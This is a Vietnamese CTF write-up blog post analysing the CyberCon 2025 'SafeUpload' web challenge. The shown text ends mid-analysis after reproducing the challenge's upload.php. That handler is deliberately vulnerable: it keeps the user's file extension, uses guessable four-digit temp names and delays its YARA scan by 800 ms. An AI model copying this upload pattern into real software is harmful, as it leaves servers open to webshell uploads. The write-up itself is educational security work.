<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CyberCon 2025 SafeUpload Web Challenge | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến">
<meta property="og:type" content="article">
<meta property="og:title" content="CyberCon 2025 SafeUpload Web Challenge">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-14T19:34:38.215Z">
<meta property="article:modified_time" content="2025-10-24T05:38:35.000Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CyberCon 2025 SafeUpload Web Challenge",
  "url": "https://pzhat.github.io/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-14T19:34:38.215Z",
  "dateModified": "2025-10-24T05:38:35.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CyberCon 2025 SafeUpload Web Challenge',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">CyberCon 2025 SafeUpload Web Challenge</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CyberCon 2025 SafeUpload Web Challenge</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.215Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-24T05:38:35.000Z" title="Updated 2025-10-24 12:38:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CyberCon-2025-SafeUpload-Web-Challenge"><a href="#CyberCon-2025-SafeUpload-Web-Challenge" class="headerlink" title="CyberCon 2025 SafeUpload Web Challenge"></a>CyberCon 2025 SafeUpload Web Challenge</h1><h3 id="Tong-quan-challenge"><a href="#Tong-quan-challenge" class="headerlink" title="Tổng quan challenge"></a>Tổng quan challenge</h3><p><img src="https://hackmd.io/_uploads/Hkm8uTIjll.png" alt="image"></p>
<p>Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload.</p>
<p>Tiến hành thử upload lên file php với nội dung:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/B1guFaUsxx.png" alt="image"></p>
<p>Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.</p>
<p><img src="https://hackmd.io/_uploads/H1i6F6Loxe.png" alt="image"></p>
<p>Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình thường lên hệ thống. Bây giờ ta tiến hành review source code của bài.</p>
<h3 id="Phan-tich-source-code"><a href="#Phan-tich-source-code" class="headerlink" title="Phân tích source code"></a>Phân tích source code</h3><p>Source code challenge có 3 files chính đó là <code>index.php</code>, <code>upload.php</code> và <code>i_dont_like_webshell.yar</code> với <code>index.php</code> sẽ xử lý phần UI UX của web nên ta sẽ bỏ qua file đó và đi với 2 file chính là <code>upload.php</code> cùng <code>i_dont_like_webshell.yar</code> file <code>upload.php</code> sẽ xử lý logic của chức năng upload của bài và <code>i_dont_like_webshell.yar</code> là file rule của yara chịu trách nghiệm làm lớp filter cho chức năng upload.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$TMP_DIR</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"><span class="variable">$DST_DIR</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads&#x27;</span>;</span><br><span class="line"><span class="variable">$YARA</span>    = <span class="string">&#x27;/usr/bin/yara&#x27;</span>;</span><br><span class="line"><span class="variable">$RULES</span>   = <span class="string">&#x27;/var/app/rules/i_dont_like_webshell.yar&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">four_digits</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">str_pad</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">9999</span>), <span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>, STR_PAD_LEFT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ext_of</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="variable">$e</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION) ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$e</span> ? <span class="string">&quot;.<span class="subst">$e</span>&quot;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$c</span>=<span class="number">400</span></span>)</span>&#123; <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$c</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$m</span>,ENT_QUOTES,<span class="string">&#x27;UTF-8&#x27;</span>); <span class="keyword">exit</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;POST only&#x27;</span>,<span class="number">405</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) || !<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;no file&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$orig</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;noname&#x27;</span>;</span><br><span class="line"><span class="variable">$ext</span>  = <span class="title function_ invoke__">ext_of</span>(<span class="variable">$orig</span>);</span><br><span class="line"><span class="variable">$rand</span> = <span class="title function_ invoke__">four_digits</span>();</span><br><span class="line"><span class="variable">$tmp_path</span> = <span class="variable">$TMP_DIR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$rand</span> . <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$tmp_path</span>)) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;save failed&#x27;</span>,<span class="number">500</span>);</span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="variable">$tmp_path</span>, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">800</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> = []; <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s -m %s %s 2&gt;&amp;1&#x27;</span>,</span><br><span class="line">  <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$YARA</span>),</span><br><span class="line">  <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$RULES</span>),</span><br><span class="line">  <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$tmp_path</span>)</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$out</span>, <span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stdout</span>   = <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$ruleName</span> = <span class="string">&#x27;Suspicious_there_is_no_such_text_string_in_the_image&#x27;</span>;</span><br><span class="line"><span class="variable">$hitByName</span> = (<span class="title function_ invoke__">strpos</span>(<span class="variable">$stdout</span>, <span class="variable">$ruleName</span>) !== <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ret</span> === <span class="number">1</span> || <span class="variable">$hitByName</span>) &#123;</span><br><span class="line">  @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Upload scanned: MALWARE detected. File removed.&lt;br&gt;&lt;a href=/&gt;back&lt;/a&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$ret</span> === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="variable">$dst</span> = <span class="variable">$DST_DIR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  <span class="keyword">if</span> (!@<span class="title function_ invoke__">rename</span>(<span class="variable">$tmp_path</span>, <span class="variable">$dst</span>)) &#123; @<span class="title function_ invoke__">copy</span>(<span class="variable">$tmp_path</span>, <span class="variable">$dst</span>); @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>); &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Upload scanned: OK. Moved to &lt;a href=./uploads/&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$dst</span>)) . <span class="string">&quot;&gt;View Guide&lt;/a&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;scan error&#x27;</span>,<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Đây là phần chịu trách nghiệm xử lý logic chính cho chức năng upload với:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$TMP_DIR</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"><span class="variable">$DST_DIR</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads&#x27;</span>;</span><br><span class="line"><span class="variable">$YARA</span>    = <span class="string">&#x27;/usr/bin/yara&#x27;</span>;</span><br><span class="line"><span class="variable">$RULES</span>   = <span class="string">&#x27;/var/app/rules/i_dont_like_webshell.yar&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>strict_types=1</code>: Bật kiểm tra kiểu dữ liệu.</li>
<li><code>display_errors=0</code>: Không hiển thị lỗi.<br> Khai báo:</li>
<li>Thư mục lưu file tạm.</li>
<li>Thư mục lưu file hợp lệ.</li>
<li>Đường dẫn tới YARA và tập rule .yar.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">four_digits</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">str_pad</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">9999</span>), <span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>, STR_PAD_LEFT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Đoạn này sẽ tạo ra 4 chữ số ngẫu nhiên (0000 -&gt; 9999) để dùng làm tên file tmp.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ext_of</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="variable">$e</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION) ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$e</span> ? <span class="string">&quot;.<span class="subst">$e</span>&quot;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Lấy nguyên phần extension của file từ file gốc.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$c</span>=<span class="number">400</span></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$c</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$m</span>,ENT_QUOTES,<span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Hàm hiển thị lỗi và thoát chương trình.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;POST only&#x27;</span>,<span class="number">405</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) || !<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;no file&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>Hàm kiểm tra HTTP request và kiểm tra xem có upload đúng file hay không.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$orig</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;noname&#x27;</span>;</span><br><span class="line"><span class="variable">$ext</span>  = <span class="title function_ invoke__">ext_of</span>(<span class="variable">$orig</span>);</span><br><span class="line"><span class="variable">$rand</span> = <span class="title function_ invoke__">four_digits</span>();</span><br><span class="line"><span class="variable">$tmp_path</span> = <span class="variable">$TMP_DIR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$rand</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure>

<p>Xử lý file upload lên ở đây nó sẽ lấy tên gốc của file được upload lên sau đó lấy đuôi file gốc và gọi đến hàm <code>four_digits</code> để tạo số random từ đó gộp thành đường dẫn tạm thời nó sẽ có dạng <code>/tmp/XXXX.php</code>.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$tmp_path</span>)) <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;save failed&#x27;</span>,<span class="number">500</span>);</span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="variable">$tmp_path</span>, <span class="number">0644</span>);</span><br></pre></td></tr></table></figure>

<p>Di chuyển file vào thư mục <code>/tmp</code> và gán quyền 0644.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">800</span> * <span class="number">1000</span>); <span class="comment">// 800ms</span></span><br></pre></td></tr></table></figure>

<p>Delay 800 giây có vẻ để chống brute force.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$out</span> = []; <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s -m %s %s 2&gt;&amp;1&#x27;</span>,</span><br><span class="line">  <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$YARA</span>),</span><br><span class="line">  <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$RULES</span>),</span><br><span class="line">  <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$tmp_path</span>)</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$out</span>, <span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure>

